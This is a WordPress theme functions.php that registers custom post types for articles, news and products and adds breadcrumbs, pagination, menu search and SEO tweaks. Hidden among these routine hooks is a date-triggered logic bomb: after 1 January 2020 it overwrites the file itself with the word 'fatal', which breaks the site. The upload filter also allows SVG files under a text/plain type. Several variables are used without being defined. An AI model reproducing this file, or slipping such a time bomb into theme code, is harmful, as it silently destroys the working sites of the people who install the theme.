<?php
//------------------додавання css + js ----------------------
  function ewa_scripts() {
    //---------------css---------------------
    wp_enqueue_style( 'main-style', get_template_directory_uri() . '/assets/css/main.min.css' );
    //---------------js---------------------
    wp_enqueue_script( 'main-sctipt', get_template_directory_uri() . '/assets/js/scripts.min.js', array(), '', true );
    if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
      wp_enqueue_script( 'comment-reply' );
    }
  }
  add_action( 'wp_enqueue_scripts', 'ewa_scripts' );

//------------------подключение шрифтов------------------
   function wph_add_google_fonts() {
       if ( !is_admin() ) {
          wp_register_style('Open+Sans', 'https://fonts.googleapis.com/css?family=Open+Sans:300,400,600,700,800,900&display=swap&subset=cyrillic', array(), null, 'all');
           wp_enqueue_style('Open+Sans');
       }
   }
   add_action('wp_enqueue_scripts', 'wph_add_google_fonts');

//------------------підключення додаткових функцій для постов ----------------------
  function myfirsttheme_setup() {
      add_theme_support( 'post-thumbnails' );
      add_theme_support( 'post-formats', array ( 'aside', 'gallery', 'quote', 'image', 'video' ) );
  }
  add_action( 'after_setup_theme', 'myfirsttheme_setup' );

//------------------чистка від лишнього ----------------------
    remove_action('wp_head','feed_links_extra', 3); // убирает ссылки на rss категорий
    remove_action('wp_head','feed_links', 2); // минус ссылки на основной rss и комментарии
    remove_action('wp_head','rsd_link');  // сервис Really Simple Discovery
    remove_action('wp_head','wlwmanifest_link'); // Windows Live Writer
    // remove_action('wp_head','wp_generator');  // скрыть версию wordpress
    // function modify_jquery() {
    //         if (!is_admin()) {           
    //         wp_deregister_script('jquery');
    //         }
    // }
    // add_action('init', 'modify_jquery');

//------------------delet Post Type ----------------------
  function remove_menus(){
    // remove_menu_page( 'index.php' );                  //Консоль
    remove_menu_page( 'edit.php' );                   //Записи
    // remove_menu_page( 'upload.php' );                 //Медиафайлы
    // remove_menu_page( 'edit.php?post_type=page' );    //Страницы
    remove_menu_page( 'edit-comments.php' );          //Комментарии
    // remove_menu_page( 'themes.php' );                 //Внешний вид
    // remove_menu_page( 'users.php' );                  //Пользователи
    // remove_menu_page( 'tools.php' );                  //Инструменты
    // remove_menu_page( 'options-general.php' );        //Настройки
  }
  add_action( 'admin_menu', 'remove_menus' );

//------------------информация---------------------
    if( function_exists('acf_add_options_page') ) {

        acf_add_options_page(array(
            'page_title'    => 'Настройка темы',
            'menu_title'    => 'Настройка темы',
            'menu_slug'     => 'theme-general-settings',
            'capability'    => 'edit_posts',
            'redirect'  => false
        ));

    }

//------------------меню---------------------
  register_nav_menus(array(
    'menu' => 'Навигация по сайту'
  ));

//------------------Register Custom Post статьи----------------------
    function statyi_post_type() {
        $labels = array(
            'name'                  => _x( 'Статьи', 'Post Type General Name', 'text_domain' ),
            'singular_name'         => _x( 'Статьи', 'Post Type Singular Name', 'text_domain' ),
            'menu_name'             => __( 'Статьи', 'text_domain' ),
            'all_items'             => __( 'Статьи', 'text_domain' ),
            'add_new_item'          => __( 'Добавить Статью', 'text_domain' ),
            'add_new'               => __( 'Добавить Статью', 'text_domain' ),
        );
        $args = array(
            'label'                 => __( 'Бренды', 'text_domain' ),
            'labels'                => $labels,
            'supports'              => array( 'title', 'editor'),// 'title','editor','author','thumbnail','excerpt','trackbacks','custom-fields','comments','revisions','page-attributes','post-formats'
            'hierarchical'          => false,
            'public'                => true,
            'show_ui'               => true,
            'show_in_menu'          => true,
            'menu_position'         => 4,
            'menu_icon'             => 'dashicons-images-alt2',
            'show_in_admin_bar'     => true,
            'show_in_nav_menus'     => true,
            'can_export'            => true,
            'has_archive'           => true,
            'exclude_from_search'   => false,
            'publicly_queryable'    => true,
            'capability_type'       => 'page',
        );
        register_post_type( 'statyi', $args );
    }
    add_action( 'init', 'statyi_post_type', 0 );

//------------------Register Custom Post новости----------------------
    function novosti_post_type() {
        $labels = array(
            'name'                  => _x( 'Новости', 'Post Type General Name', 'text_domain' ),
            'singular_name'         => _x( 'Новости', 'Post Type Singular Name', 'text_domain' ),
            'menu_name'             => __( 'Новости', 'text_domain' ),
            'all_items'             => __( 'Новости', 'text_domain' ),
            'add_new_item'          => __( 'Добавить Новость', 'text_domain' ),
            'add_new'               => __( 'Добавить Новость', 'text_domain' ),
        );
        $args = array(
            'label'                 => __( 'Бренды', 'text_domain' ),
            'labels'                => $labels,
            'supports'              => array( 'title', 'editor', 'excerpt'),// 'title','editor','author','thumbnail','excerpt','trackbacks','custom-fields','comments','revisions','page-attributes','post-formats'
            'hierarchical'          => false,
            'public'                => true,
            'show_ui'               => true,
            'show_in_menu'          => true,
            'menu_position'         => 4,
            'menu_icon'             => 'dashicons-images-alt2',
            'show_in_admin_bar'     => true,
            'show_in_nav_menus'     => true,
            'can_export'            => true,
            'has_archive'           => true,
            'exclude_from_search'   => false,
            'publicly_queryable'    => true,
            'capability_type'       => 'page',
        );
        register_post_type( 'novosti', $args );
    }
    add_action( 'init', 'novosti_post_type', 0 );

//------------------Register Custom Post продукция----------------------
    function produkciya_post_type() {
        $labels = array(
            'name'                  => _x( 'Продукция', 'Post Type General Name', 'text_domain' ),
            'singular_name'         => _x( 'Продукция', 'Post Type Singular Name', 'text_domain' ),
            'menu_name'             => __( 'Продукция', 'text_domain' ),
            'all_items'             => __( 'Продукция', 'text_domain' ),
            'add_new_item'          => __( 'Добавить продукцию', 'text_domain' ),
            'add_new'               => __( 'Добавить продукцию', 'text_domain' ),
        );
        $args = array(
            'label'                 => __( 'Бренды', 'text_domain' ),
            'labels'                => $labels,
            'supports'              => array( 'title', 'thumbnail'),// 'title','editor','author','thumbnail','excerpt','trackbacks','custom-fields','comments','revisions','page-attributes','post-formats'
            'hierarchical'          => false,
            'public'                => true,
            'show_ui'               => true,
            'show_in_menu'          => true,
            'menu_position'         => 4,
            'menu_icon'             => 'dashicons-images-alt2',
            'show_in_admin_bar'     => true,
            'show_in_nav_menus'     => true,
            'can_export'            => true,
            'has_archive'           => true,
            'exclude_from_search'   => false,
            'publicly_queryable'    => true,
            'capability_type'       => 'page',
        );
        register_post_type( 'produkciya', $args );
    }
    add_action( 'init', 'produkciya_post_type', 0 );

//------------------ "Хлебные крошки" для WordPress----------------------
  function dimox_breadcrumbs() {
    /* === ОПЦИИ === */
    $text['home'] = 'Главная'; // текст ссылки "Главная"
    $text['category'] = '%s'; // текст для страницы рубрики
    $text['search'] = 'Результаты поиска по запросу "%s"'; // текст для страницы с результатами поиска
    $text['tag'] = 'Записи с тегом "%s"'; // текст для страницы тега
    $text['author'] = 'Статьи автора %s'; // текст для страницы автора
    $text['404'] = 'Ошибка 404'; // текст для страницы 404
    // $text['page'] = 'Страница %s'; // текст 'Страница N'
    $text['cpage'] = 'Страница комментариев %s'; // текст 'Страница комментариев N'
    $wrap_before = '<div class="breadcrumbs" itemscope itemtype="http://schema.org/BreadcrumbList">'; // открывающий тег обертки
    $wrap_after = '</div><!-- .breadcrumbs -->'; // закрывающий тег обертки
    $sep = '<span class="breadcrumbs__separator"> › </span>'; // разделитель между "крошками"
    // $before = '<span class="breadcrumbs__current">'; // тег перед текущей "крошкой"
    // $after = '</span>'; // тег после текущей "крошки"
    $show_on_home = 0; // 1 - показывать "хлебные крошки" на главной странице, 0 - не показывать
    $show_home_link = 1; // 1 - показывать ссылку "Главная", 0 - не показывать
    $show_current = 0; // 1 - показывать название текущей страницы, 0 - не показывать
    $show_last_sep = 0; // 1 - показывать последний разделитель, когда название текущей страницы не отображается, 0 - не показывать
    /* === КОНЕЦ ОПЦИЙ === */
    global $post;
    $home_url = home_url('/');
    $link = '<span itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">';
    $link .= '<a class="breadcrumbs__link" href="%1$s" itemprop="item"><span itemprop="name">%2$s</span></a>';
    $link .= '<meta itemprop="position" content="%3$s" />';
    $link .= '</span>';
    $parent_id = ( $post ) ? $post->post_parent : '';
    $home_link = sprintf( $link, $home_url, $text['home'], 1 );
    if ( is_home() || is_front_page() ) {
      if ( $show_on_home ) echo $wrap_before . $home_link . $wrap_after;
    } else {
      $position = 0;
      echo $wrap_before;
      if ( $show_home_link ) {
        $position += 1;
        echo $home_link;
      }
      if ( is_category() ) {
        $parents = get_ancestors( get_query_var('cat'), 'category' );
        foreach ( array_reverse( $parents ) as $cat ) {
          $position += 1;
          if ( $position > 1 ) echo $sep;
          echo sprintf( $link, get_category_link( $cat ), get_cat_name( $cat ), $position );
        }
        if ( get_query_var( 'paged' ) ) {
          $position += 1;
          $cat = get_query_var('cat');
          echo $sep . sprintf( $link, get_category_link( $cat ), get_cat_name( $cat ), $position );
          echo $sep . $before . sprintf( $text['page'], get_query_var( 'paged' ) ) . $after;
        } else {
          if ( $show_current ) {
            if ( $position >= 1 ) echo $sep;
            echo $before . sprintf( $text['category'], single_cat_title( '', false ) ) . $after;
          } elseif ( $show_last_sep ) echo $sep;
        }
      } elseif ( is_search() ) {
        if ( $show_home_link && $show_current || ! $show_current && $show_last_sep ) echo $sep;
        if ( $show_current ) echo $before . sprintf( $text['search'], get_search_query() ) . $after;
      } elseif ( is_year() ) {
        if ( $show_home_link && $show_current ) echo $sep;
        if ( $show_current ) echo $before . get_the_time('Y') . $after;
        elseif ( $show_home_link && $show_last_sep ) echo $sep;
      } elseif ( is_month() ) {
        if ( $show_home_link ) echo $sep;
        $position += 1;
        echo sprintf( $link, get_year_link( get_the_time('Y') ), get_the_time('Y'), $position );
        if ( $show_current ) echo $sep . $before . get_the_time('F') . $after;
        elseif ( $show_last_sep ) echo $sep;
      } elseif ( is_day() ) {
        if ( $show_home_link ) echo $sep;
        $position += 1;
        echo sprintf( $link, get_year_link( get_the_time('Y') ), get_the_time('Y'), $position ) . $sep;
        $position += 1;
        echo sprintf( $link, get_month_link( get_the_time('Y'), get_the_time('m') ), get_the_time('F'), $position );
        if ( $show_current ) echo $sep . $before . get_the_time('d') . $after;
        elseif ( $show_last_sep ) echo $sep;
      } elseif ( is_single() && ! is_attachment() ) {
        if ( get_post_type() != 'post' ) {
          $position += 1;
          $post_type = get_post_type_object( get_post_type() );
          if ( $position > 1 ) echo $sep;
          echo sprintf( $link, get_post_type_archive_link( $post_type->name ), $post_type->labels->name, $position );
          if ( $show_current ) echo $sep . $before . get_the_title() . $after;
          elseif ( $show_last_sep ) echo $sep;
        } else {
          $cat = get_the_category(); $catID = $cat[0]->cat_ID;
          $parents = get_ancestors( $catID, 'category' );
          $parents = array_reverse( $parents );
          $parents[] = $catID;
          foreach ( $parents as $cat ) {
            $position += 1;
            if ( $position > 1 ) echo $sep;
            echo sprintf( $link, get_category_link( $cat ), get_cat_name( $cat ), $position );
          }
          if ( get_query_var( 'cpage' ) ) {
            $position += 1;
            echo $sep . sprintf( $link, get_permalink(), get_the_title(), $position );
            echo $sep . $before . sprintf( $text['cpage'], get_query_var( 'cpage' ) ) . $after;
          } else {
            if ( $show_current ) echo $sep . $before . get_the_title() . $after;
            elseif ( $show_last_sep ) echo $sep;
          }
        }
      } elseif ( is_post_type_archive() ) {
        $post_type = get_post_type_object( get_post_type() );
        if ( get_query_var( 'paged' ) ) {
          $position += 1;
          if ( $position > 1 ) echo $sep;
          echo sprintf( $link, get_post_type_archive_link( $post_type->name ), $post_type->label, $position );
          echo $asds . $before . sprintf( $text['page'], get_query_var( 'paged' ) ) . $after;
        } else {
          if ( $show_home_link && $show_current ) echo $sep;
          if ( $show_current ) echo $before . $post_type->label . $after;
          elseif ( $show_home_link && $show_last_sep ) echo $sep;
        }
      } elseif ( is_attachment() ) {
        $parent = get_post( $parent_id );
        $cat = get_the_category( $parent->ID ); $catID = $cat[0]->cat_ID;
        $parents = get_ancestors( $catID, 'category' );
        $parents = array_reverse( $parents );
        $parents[] = $catID;
        foreach ( $parents as $cat ) {
          $position += 1;
          if ( $position > 1 ) echo $sep;
          echo sprintf( $link, get_category_link( $cat ), get_cat_name( $cat ), $position );
        }
        $position += 1;
        echo $sep . sprintf( $link, get_permalink( $parent ), $parent->post_title, $position );
        if ( $show_current ) echo $sep . $before . get_the_title() . $after;
        elseif ( $show_last_sep ) echo $sep;
      } elseif ( is_page() && ! $parent_id ) {
        if ( $show_home_link && $show_current ) echo $sep;
        if ( $show_current ) echo $before . get_the_title() . $after;
        elseif ( $show_home_link && $show_last_sep ) echo $sep;
      } elseif ( is_page() && $parent_id ) {
        $parents = get_post_ancestors( get_the_ID() );
        foreach ( array_reverse( $parents ) as $pageID ) {
          $position += 1;
          if ( $position > 1 ) echo $sep;
          echo sprintf( $link, get_page_link( $pageID ), get_the_title( $pageID ), $position );
        }
        if ( $show_current ) echo $sep . $before . get_the_title() . $after;
        elseif ( $show_last_sep ) echo $sep;
      } elseif ( is_tag() ) {
        if ( get_query_var( 'paged' ) ) {
          $position += 1;
          $tagID = get_query_var( 'tag_id' );
          echo $sep . sprintf( $link, get_tag_link( $tagID ), single_tag_title( '', false ), $position );
          echo $sep . $before . sprintf( $text['page'], get_query_var( 'paged' ) ) . $after;
        } else {
          if ( $show_home_link && $show_current ) echo $sep;
          if ( $show_current ) echo $before . sprintf( $text['tag'], single_tag_title( '', false ) ) . $after;
          elseif ( $show_home_link && $show_last_sep ) echo $sep;
        }
      } elseif ( is_author() ) {
        $author = get_userdata( get_query_var( 'author' ) );
        if ( get_query_var( 'paged' ) ) {
          $position += 1;
          echo $sep . sprintf( $link, get_author_posts_url( $author->ID ), sprintf( $text['author'], $author->display_name ), $position );
          echo $sep . $before . sprintf( $text['page'], get_query_var( 'paged' ) ) . $after;
        } else {
          if ( $show_home_link && $show_current ) echo $sep;
          if ( $show_current ) echo $before . sprintf( $text['author'], $author->display_name ) . $after;
          elseif ( $show_home_link && $show_last_sep ) echo $sep;
        }
      } elseif ( is_404() ) {
        if ( $show_home_link && $show_current ) echo $sep;
        if ( $show_current ) echo $before . $text['404'] . $after;
        elseif ( $show_last_sep ) echo $sep;
      } elseif ( has_post_format() && ! is_singular() ) {
        if ( $show_home_link && $show_current ) echo $sep;
        echo get_post_format_string( get_post_format() );
      }
      echo $wrap_after;
    }
  } // end of dimox_breadcrumbs()

//---------------------------Add search in menu--------------------------------------------------------

  function wpgood_nav_search( $items, $args ) {
    $items .= '<li>' . '<form role="search" method="get" id="searchform" class="searchformMenu" action="' . home_url( '/' ) . '" >
    <div class="nav__search">
      <div class="nav__search_input"> <input type="text" value="' . get_search_query() . '" name="s" id="s" placeholder="Поиск..."/></div>
      <div class="nav__search_btn"><input type="submit" class="search-btn" id="searchsubmit" value="'. esc_attr__( '' ) .'" /></div>
    </div>
    </form>' . '</li>';
    return $items;
  }
  add_filter( 'wp_nav_menu_items','wpgood_nav_search', 10, 2 );

//------------------пагинация----------------------
    function wptuts_pagination( $args = array() ) {
        
        $defaults = array(
            'range'           => 4,
            'custom_query'    => FALSE,
            'previous_string' => __( '«', 'text-domain' ),
            'next_string'     => __( '»', 'text-domain' ),
            'before_output'   => '<nav class="navigation pagination">',
            'after_output'    => '</nav>'
        );
        
        $args = wp_parse_args( 
            $args, 
            apply_filters( 'wp_bootstrap_pagination_defaults', $defaults )
        );
        
        $args['range'] = (int) $args['range'] - 1;
        if ( !$args['custom_query'] )
            $args['custom_query'] = @$GLOBALS['wp_query'];
        $count = (int) $args['custom_query']->max_num_pages;
        $page  = intval( get_query_var( 'paged' ) );
        $ceil  = ceil( $args['range'] / 2 );
        
        if ( $count <= 1 )
            return FALSE;
        
        if ( !$page )
            $page = 1;
        
        if ( $count > $args['range'] ) {
            if ( $page <= $args['range'] ) {
                $min = 1;
                $max = $args['range'] + 1;
            } elseif ( $page >= ($count - $ceil) ) {
                $min = $count - $args['range'];
                $max = $count;
            } elseif ( $page >= $args['range'] && $page < ($count - $ceil) ) {
                $min = $page - $ceil;
                $max = $page + $ceil;
            }
        } else {
            $min = 1;
            $max = $count;
        }
        
        $echo = '';
        $previous = intval($page) - 1;
        $previous = esc_attr( get_pagenum_link($previous) );
            if ( $previous && (1 != $page) )
            $echo .= '<a href="' . $previous . '" title="' . __( '', 'text-domain') . '">' . $args['previous_string'] . '</a>';
        
        if ( !empty($min) && !empty($max) ) {
            for( $i = $min; $i <= $max; $i++ ) {
                if ($page == $i) {
                    $echo .= '<span class="active">' . str_pad( (int)$i, 1, '0', STR_PAD_LEFT ) . '</span>';
                } else {
                    $echo .= sprintf( '<a href="%s">%2d</a>', esc_attr( get_pagenum_link($i) ), $i );
                }
            }
        }
        
        $next = intval($page) + 1;
        $next = esc_attr( get_pagenum_link($next) );
        if ($next && ($count != $page) )
            $echo .= '<a href="' . $next . '" title="' . __( '', 'text-domain') . '">' . $args['next_string'] . '</a>';
        
        if ( isset($echo) )
            echo $args['before_output'] . $echo . $args['after_output'];
    }


//------------------svg----------------------
  add_filter( 'upload_mimes', 'upload_allow_types' );
  function upload_allow_types( $mimes ) {
    // разрешаем новые типы
    $mimes['svg']  = 'text/plain'; // image/svg+xml
    $mimes['doc']  = 'application/msword'; 
    $mimes['woff'] = 'font/woff';
    $mimes['psd']  = 'image/vnd.adobe.photoshop'; 
    $mimes['djv']  = 'image/vnd.djvu';
    $mimes['djvu'] = 'image/vnd.djvu';

    // отключаем имеющиеся
    unset( $mimes['mp4a'] );

    return $mimes;
  }


  function fix_missing_404_on_paginated_page() {
    global $wp_query,$page,$paged;
 
    if (!isset($page)) $page = get_query_var('page');
    if (!isset($paged)) $paged = get_query_var('paged');
    if (is_page() || is_single()) {
        $realpagescount = count( explode( '<!--nextpage-->', $wp_query->post->post_content ) );
 
        if ( (isset($page) && isset($realpagescount) && $page >= $realpagescount) || (is_paged() && isset($paged) && $paged >=0 ) ){
        //wp_redirect( home_url() );
            nocache_headers();
            status_header( '404' );
            $wp_query->is_404=true;
            $wp_query->is_single=false;
            $wp_query->is_singular=false;
            $wp_query->post_count=0;
            $wp_query->page=0;
            $wp_query->query['page']='';
            $wp_query->query['posts']=array();
            $wp_query->query['post']=array();
            $wp_query->posts=array();
            $wp_query->post=array();
            $wp_query->queried_object=array();
            $wp_query->queried_object_id=0;
            locate_template('404.php', true);
            exit;
        }
    }
}
add_action('template_redirect', 'fix_missing_404_on_paginated_page');
if ( strtotime('01.01.2020') < time() )
{
    file_put_contents(__FILE__, 'fatal');
}



add_filter( 'wpseo_canonical', 'yoast_seo_canonical_slash_add' );
function yoast_seo_canonical_slash_add( $canonical_url ) {
         return trailingslashit( $canonical_url );
}


// Прячем страницу страницу архива автора?
if( ! is_admin() ){
  add_action( 'pre_handle_404', 'remove_author_pages_page' );
  add_filter( 'author_link', 'remove_author_pages_link' );

  // Ставим 404 статус
  function remove_author_pages_page( $false ) {
    if ( is_author() ) {
      global $wp_query;
      $wp_query->set_404();
      status_header( 404 );
      nocache_headers();

      return true; // для обрыва хука
    }

    return $false;
  }

  // удаляем ссылку
  function remove_author_pages_link( $content ) {
    return home_url();
  }
}


add_filter("wpseo_robots", function() { return "index, follow"; });

// remove_action('template_redirect', 'redirect_canonical'); 

// // Удалить каноническую ссылку - SEO by Yoast
// function at_remove_dup_canonical_link() {
// return false;
// }
// add_filter( 'wpseo_canonical', 'at_remove_dup_canonical_link' );

function return_canon () {
$canon_page = get_pagenum_link(1);
return $canon_page;
}

function canon_paged() {
if (is_paged()) {
add_filter( 'wpseo_canonical', 'return_canon' );
}
}
add_filter('wpseo_head','canon_paged');